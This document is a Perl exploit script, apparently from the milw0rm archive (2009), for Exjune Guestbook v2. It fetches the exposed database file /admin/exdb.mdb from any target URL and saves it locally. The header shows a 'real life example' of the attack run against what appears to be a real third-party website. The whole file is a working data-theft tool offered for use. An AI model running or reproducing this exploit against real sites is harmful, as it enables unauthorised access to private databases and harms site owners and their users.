#!/usr/bin/perl
# By AlpHaNiX [NullArea.Net]
# alpha[at]hacker.bz
# Made in Tunisia
###########
# script : Exjune Guestbook v2
# download : http://www.exjune.com/downloads/downloads/exJune_guestbook.asp
###########
# Vulnerable :
# database path : /admin/exdb.mdb
##########
# Real Life Example :
#
#
# OOO  OOO           OO    OO        OO
#  OO   O             O     O         O
#  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO
#  O  O O   O   O     O     O        OOO    OO     OOOOOO       O
#  O   OO   O   O     O     O       O   O   O      O       OOOOOO
# OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO
#
#
#[-] Exjune Guestbook v2 Remote Database Disclosure Exploit
#[-] Found & Exploited By AlpHaNiX
#
#
#[!] Exploiting http://www.ladyslipperretreat.com/guestbook// ....
#[+] http://www.ladyslipperretreat.com/guestbook// Exploited ! Database saved to c:/db.mdb
##########
# Greetz for Zigma/Djek/unary/r1z


use lwp::UserAgent;

system('cls');
system('title Exjune Guestbook v2 Remote Database Disclosure Exploit');
system('color 2');
if (!defined($ARGV[0])) {print "[!] Usage : \n    ./exploit http://site.com\n";exit();}
if ($ARGV[0] =~ /http:\/\// ) { $site = $ARGV[0]."/"; } else { $site = "http://".$ARGV[0]."/"; }
print "\n\n\n\n OOO  OOO           OO    OO        OO\n" ;
print "  OO   O             O     O         O\n" ;
print "  O O  O  OO  OO     O     O        O O   OO OOO   OOOO    OOOOO\n" ;
print "  O  O O   O   O     O     O        OOO    OO     OOOOOO       O\n" ;
print "  O   OO   O   O     O     O       O   O   O      O       OOOOOO\n" ;
print " OOO  OO   OOOOO   OOOOO OOOOO    OOO OOO OOOOO    OOOOO  OOOO OO\n" ;
print "\n\n[-] Exjune Guestbook v2 Remote Database Disclosure Exploit\n";
print "[-] Found & Exploited By AlpHaNiX \n\n\n";
print "[!] Exploiting $site ....\n";
my $site      = $ARGV[0] ;
my $target    = $site."/admin/exdb.mdb" ;
my $useragent = LWP::UserAgent->new();
my $request   = $useragent->get($target,":content_file" => "c:/db.mdb");
if ($request->is_success) {print "[+] $site Exploited ! Database saved to c:/db.mdb";exit();}
else {print "[!] Exploiting $site Failed !\n[!] ".$request->status_line."\n";exit();}

# milw0rm.com [2009-04-09]
